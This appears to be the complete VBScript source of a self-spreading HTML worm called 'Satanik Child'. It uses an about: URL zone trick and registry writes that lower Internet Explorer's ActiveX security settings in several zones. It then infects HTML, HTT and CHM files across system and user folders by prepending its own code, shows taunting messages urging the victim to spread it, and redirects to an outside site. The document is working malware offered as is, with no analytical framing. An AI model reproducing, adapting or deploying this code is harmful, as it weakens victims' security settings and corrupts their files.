On Error Resume Next

if location.protocol <> "file:" then
	set wcover = window.open("about:%3cSCRIPT language=%22VBScript%22%3e%3c!--%0d%0aOn Error Resume Next%0d%0aset WSHShell = CreateObject(%22WScript.Shell%22)%0d%0aWSHShell.RegWrite %22HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\4\1201%22 , 0, %22REG_DWORD%22%0d%0aWSHShell.RegWrite %22HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\4\1201%22 , 0, %22REG_DWORD%22 %0d%0awindow.close%0d%0a--%3e%3c/SCRIPT%3e%01PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP%01file://C:")
	while wcover.closed = False
		DoNothing = "Nothing"
	wend
end if

Set WSHell = CreateObject("WScript.Shell")
WSHell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WSHell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"
WSHell.Regwrite "HKMU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 1, "REG_DWORD"
Set FSO = CreateObject("Scripting.FileSystemObject")
Set Rng = document.body.createTextRange()

Set Sfolder = fso.GetSpecialFolder(0)
InfectFolder(Sfolder.Path + "\Web")
InfectFolder("C:\")
InfectFolder("C:\MyDocu~1")
InfectFolder("C:\Progra~1\ICQ")
InfectFolder("C:\WINDOWS")

if location.protocol = "file:" then
	HostPath = Replace(location.href, "file:///", "")
	HostPath = Replace(HostPath, "/", "\")
	HostPath = FSO.GetParentFolderName(HostPath)
	InfectFolder(HostPath)
end if


	msgbox "YOU ARE ABOUT TO BECOME DEMONIZED!", VbOkOnly+48, "Satanik Child"
	msgbox("WITH A NEW INFECTION THAT IVE CREATED")
	msgbox("A NEW INTERNET WORM THAT I KNOW YOU WILL HELP TO SPREAD")
	msgbox("SINCE YOURE INFECTED, WHY NOT INFECT OTHERS?")
	msgbox("I KNEW YOU WOULD SEE IT MY WAY!")
	location.href = "http://users.tmok.com/~dr_bulge/smt1/"


Sub InfectFile(FilePath)
	Set f = FSO.OpenTextFile(FilePath, 1, True)
	FileContents = f.ReadAll
	f.close
	Set f = FSO.OpenTextFile(FilePath, 2, True)
	f.WriteLine "<html><title>SATANIK CHILD</title>"
	f.Writeline "<body bgcolor=""#000000"" text=""#CCCCCC""><center><H1>--===SATANIK CHILD===--</H1></center>"
	f.WriteLine Rng.htmlText
	f.WriteLine "</body>"
	f.WriteLine "</html>"
	f.Write FileContents
	f.close
End Sub

Sub InfectFolder(FolderPath)
	if FSO.FolderExists(FolderPath) then
		Set folder = FSO.GetFolder(FolderPath)
		While folder.IsRootFolder = false 
			Set folder = fso.GetFolder(FolderPath)
			Set fc = folder.Files
			FolderPath = fso.GetParentFolderName(FolderPath)
			For each Target in fc
				InfType = Lcase(Fso.GetExtensionName(Target.name))
				if InfType = "html" or InfType = "htm" or InfType = "htt" or InfType = "chm" then
					TestString = ""
					Set fh = fso.opentextfile(Target.path, 1, true)
					if fh.AtEndOfStream <> True then
						TestString = fh.readline
					end if
					fh.close
					If TestString <> "<html> <--=== SATANIK CHILD ===-->" then
						Call InfectFile(Target.path)
					End IF
				End If
			Next
		Wend
	end if
End Sub
